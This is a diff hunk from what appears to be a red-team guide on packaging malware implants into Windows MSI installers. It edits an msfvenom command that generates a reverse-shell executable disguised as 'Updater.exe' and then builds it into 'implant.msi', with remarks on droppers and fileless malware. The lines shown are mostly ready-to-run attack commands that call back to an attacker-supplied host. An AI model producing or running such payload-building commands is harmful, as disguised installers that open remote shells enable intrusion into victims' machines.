@@ -138,7 +138,7 @@ $ wix build msigen.wix -o implant.msi
 For fileless malware just make an empty file `touch Updater.exe` unless if it's a dropper then generate with `msfvenom` implant. Then build a MSI installer.
 
 ```
-$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=53 -f exe -o Updater.exe
+$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f exe -o Updater.exe
 
 $ wixl -v msigen.wix -o implant.msi
 Loading msigen.wix...
